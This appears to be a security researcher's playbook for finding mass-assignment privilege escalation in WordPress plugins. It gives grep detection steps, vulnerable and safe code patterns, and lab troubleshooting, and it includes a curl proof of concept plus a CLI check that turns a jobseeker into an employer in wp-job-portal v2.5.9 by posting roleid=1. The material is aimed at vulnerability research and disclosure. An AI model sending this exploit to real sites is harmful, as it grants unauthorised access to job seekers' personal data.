# Authenticated Attack Surface: Mass Assignment & Privilege Escalation

When the nopriv (unauthenticated) attack surface is clean, pivot to the
authenticated surface. The most productive pattern in WordPress plugins
is **mass assignment via generic ORM/table bind() methods**.

## Core Pattern: Generic bind() Mass Assignment

Many WordPress plugins use a custom table/ORM class with a generic `bind()`
method that accepts ALL POST data and sets any matching public property:

```php
// Typical vulnerable pattern in a custom table class
public function bind($data) {
    foreach ($data as $k => $v) {
        if (isset($this->$k)) {   // any public property matching POST key
            $this->$k = $v;       // blindly set from user input
        }
    }
}
```

The controller typically overrides `id` for non-admin users but does NOT
strip other sensitive fields like `roleid`, `status`, `uid`, or `is_admin`.

## Detection Workflow

### Step 1: Find the table/ORM class
```bash
grep -rn 'function bind\b\|function setColumns\b' --include='*.php' <plugin_path>
```

### Step 2: Check for public properties that are security-sensitive
```bash
# Look at the table class properties
grep -rn 'public \$roleid\|public \$status\|public \$uid\|public \$is_admin\|public \$role\|public \$user_role' --include='*.php' <plugin_path>
```

### Step 3: Trace the save/update controller
```bash
# Find the controller that calls bind() or store()
grep -rn '->bind(\$\|->store(\$\|->save(\$_POST' --include='*.php' <plugin_path>
```

### Step 4: Check if the controller strips sensitive fields
- Does it use an explicit allowlist? (e.g., `array_intersect_key`)
- Does it only override `id` and leave everything else?
- Does it have `unset($data['roleid'])` or similar?

### Step 5: Check if there's an action policy/schema validation
- Some plugins have a central policy service that validates specific fields
- Check if the schema includes `roleid`, `status`, `uid` — if not, they pass through
- Schema validation that is **allowlist-for-validation** (checks specified fields)
  but does NOT **blocklist-for-stripping** (remove unspecified fields) is vulnerable

### Step 6: Verify with PHP CLI
When HTTP dispatch is hard to trigger (opcache, active_plugins issues),
verify via CLI:

```bash
cd /var/www/html/wordpress
php -r '
require_once "wp-load.php";
include_once WP_CONTENT_DIR . "/plugins/{plugin}/{main-file}.php";
wp_set_current_user({user_id});

// Simulate POST data
$_POST["id"] = "1";
$_POST["roleid"] = "1";  // or other sensitive field
$_POST["_wpnonce"] = wp_create_nonce("{nonce_action}");
$_SERVER["REQUEST_METHOD"] = "POST";

// Check if policy passes
echo "authorize: " . (SomePolicyService::authorize(...) ? "true" : "false") . "\n";

// Call the model directly
$model = SomeIncluder::getJSModel("{module}");
$data = $_POST;
$data["id"] = $user->uid();  // simulate controller override
$result = $model->storeUser($data);
echo "result: $result\n";

// Check the DB
global $wpdb;
echo "roleid: " . $wpdb->get_var("SELECT roleid FROM ...") . "\n";
' 2>&1 | grep -v Warning | grep -v Notice
```

## Real Example: wp-job-portal v2.5.9

**Finding:** Jobseeker → Employer privilege escalation via mass assignment

**Vulnerable chain:**
1. `formhandler.php` dispatch → `Core_Action_Policy::authorize()` passes
   (schema only validates `id` as `optional_id`, does NOT block `roleid`)
2. `user/controller.php saveuser()` — overrides `id` for non-admin, does NOT strip `roleid`
3. `user/model.php storeUser()` — calls `$row->bind($data)` with ALL POST fields
4. `tables/users.php` — `public $roleid = ''` property exists → bind() accepts it
5. `tables/table.php setColumns()` — `if(isset($this->$k)) { $this->$k = $v; }` — sets roleid
6. `classes/user.php isemployer()` — checks `currentuser->roleid == 1` → returns true

**PoC:**
```bash
# Login as jobseeker, get nonce from profile page, POST with roleid=1
curl -b cookies.txt -X POST \
  "http://target/?wpjobportalme=user&action=wpjobportaltask&task=saveuser&_wpnonce=$NONCE" \
  -d 'form_request=wpjobportal&id=1&roleid=1&wpjobportal_user_first=Test&wpjobportal_user_last=User'
```

**Impact:** Jobseeker escalates to Employer — can post jobs, view/download
resumes, access contact details of job seekers. 8k+ installs affected.

**Verified via PHP CLI:**
```
BEFORE: roleid=2  isemployer=false  isjobseeker=true
authorize: true
AFTER:  roleid=1  isemployer=true   isjobseeker=false
EXPLOIT CONFIRMED
```

## Lab Verification Lessons

### When HTTP dispatch doesn't trigger
WP plugins loaded via `include_once` in the main plugin constructor only
run when WP's plugin loader calls them. In CLI, `wp-load.php` does NOT
load plugins — you must manually `include_once` the main plugin file.

### CRITICAL: WP nonce session token mismatch (CLI vs HTTP)
WP nonces are NOT just `wp_create_nonce(action)` — they embed a
**session-specific token** from the user's WP session. A nonce generated
in CLI via `wp_set_current_user(4)` + `wp_create_nonce("action")` will
produce a DIFFERENT value than the same user's nonce in an HTTP session.

**This means:** A CLI-generated nonce will FAIL `wp_verify_nonce()` when
sent via HTTP. The exploit will return 403 "Access denied" even though
the policy logic is identical.

**Symptom:** `authorize()` returns TRUE in CLI, but HTTP returns 403.
The nonce is the culprit — not the policy, not the role, not the ownership.

**Fix — generate nonce from the HTTP session:**
Create a temporary PHP file in the web root to generate the nonce using
the actual HTTP session:

```bash
# Create temp nonce generator (must be done BEFORE deleting it)
cat > /tmp/get_nonce.php << 'EOF'
<?php
require_once '/var/www/html/wordpress/wp-load.php';
if (!is_user_logged_in()) die('not logged in');
echo wp_create_nonce('wpjobportal_user_nonce');
EOF

# Copy into web root via Docker (files owned by www-data)
docker run --rm -v /var/www/html/wordpress:/app -v /tmp:/tmp2 alpine \
  sh -c "cp /tmp2/get_nonce.php /app/get_nonce.php"

# Get nonce from HTTP session (strip PHP notices)
NONCE=$(curl -s -b cookies.txt 'http://target/get_nonce.php' | tail -1)

# IMPORTANT: delete the temp file AFTER getting the nonce
docker run --rm -v /var/www/html/wordpress:/app alpine \
  sh -c "rm -f /app/get_nonce.php"
```

**The admin bar `_wpnonce` is NOT the plugin nonce.** The `_wpnonce` in
the WP admin bar logout link uses a different nonce action than the
plugin's `wpjobportal_user_nonce`. Extracting it and sending it to the
plugin endpoint will fail with 403.

**Key takeaway:** Always verify that the nonce you extract from page HTML
matches the nonce ACTION expected by the target endpoint. Different
nonce actions produce different nonce values for the same user.

### Fixing corrupted plugin files (owned by www-data)
When `sed -i` fails with "Permission denied" on plugin files owned by
`www-data`, use Docker:

```bash
docker run --rm -v /var/www/html/wordpress/wp-content/plugins/{plugin}:/app alpine sh -c "
    sed -i '21d' /app/{file}.php
"
```

### active_plugins serialization length MUST be exact
PHP's `serialize()` format requires exact string lengths: `s:31:"path"`.
If the length is wrong, `unserialize()` fails silently and
`get_option('active_plugins')` returns `false`.

**Common mistake:** Hardcoding `s:35` when the actual plugin path is
31 characters. This causes the plugin to NOT load at all, with no
visible error — the shortcode shows as raw text `[shortcode_name]`
instead of rendered content.

**Always compute the length:**
```python
path = "wp-job-portal/wp-job-portal.php"
print(f"s:{len(path)}")  # s:31
```

**Verify the plugin is actually loaded via HTTP** (not just MySQL):
```bash
# Quick check — does the shortcode render?
curl -s 'http://target/test-page/' | grep -c 'wpjobportal\|wjportal'
# If 0, the plugin is NOT loaded despite MySQL showing it in active_plugins
```

### WP_Filesystem blocking template rendering
Even with `define('FS_METHOD','direct')` in wp-config.php, some plugins
call `request_filesystem_credentials(site_url())` in their template
includer. If WP_Filesystem is not properly initialized in the HTTP
context, template rendering fails silently — the page loads but the
plugin's form/content is missing.

**Fix Option 1 — Patch the includer to bypass WP_Filesystem:**
```bash
# Replace $wp_filesystem->exists() with native file_exists()
docker run --rm -v {plugin_path}:/app alpine sh -c "
  sed -i 's|\$wp_filesystem->exists(|file_exists(|g' /app/includes/includer.php
  sed -i 's|if ( ! function_exists( .WP_Filesystem.) {|if ( false) {|g' /app/includes/includer.php
"
```

**Fix Option 2 — Ensure WP_Filesystem initializes before the plugin:**
Add to wp-config.php BEFORE `require_once ABSPATH . 'wp-settings.php'`:
```php
require_once ABSPATH . 'wp-admin/includes/file.php';
WP_Filesystem();
```

### Opcache staleness after file edits
After editing plugin PHP files, restart Apache to clear opcache:
```bash
sudo systemctl restart apache2
```

## Other Authenticated Patterns to Check

### Pattern: Controller saves ALL POST data without allowlist
```php
// VULNERABLE — binds everything from POST
$data = WPJOBPORTALrequest::get('post');
$row->bind($data);  // mass assignment

// SAFE — explicit allowlist
$allowed = array('id', 'first_name', 'last_name');
$data = array_intersect_key($data, array_flip($allowed));
$row->bind($data);
```

### Pattern: Policy schema validates but doesn't strip
```php
// Policy schema only checks 'id' — roleid passes through
$schema = array('id' => array('type' => 'optional_id'));
// This is allowlist-for-validation, NOT blocklist-for-stripping
```

### Pattern: Nonce available on frontend pages
```php
// Nonce generated and exposed to all visitors
$nonce = wp_create_nonce('plugin_nonce');
wp_localize_script('script', 'common', array('nonce' => $nonce));
// Any logged-in user can extract this nonce from page HTML
```

## Patchstack Eligibility

Mass assignment privesc is Patchstack-eligible under:
- **Type:** Broken Access Control / Privilege Escalation (CWE-269, CWE-915)
- **Condition:** Must lead to contributor+ access or role escalation
- **OWASP:** A01:2023 — Broken Access Control

Jobseeker → Employer escalation qualifies because employer role
gives access to resume data (PII: emails, phone numbers).
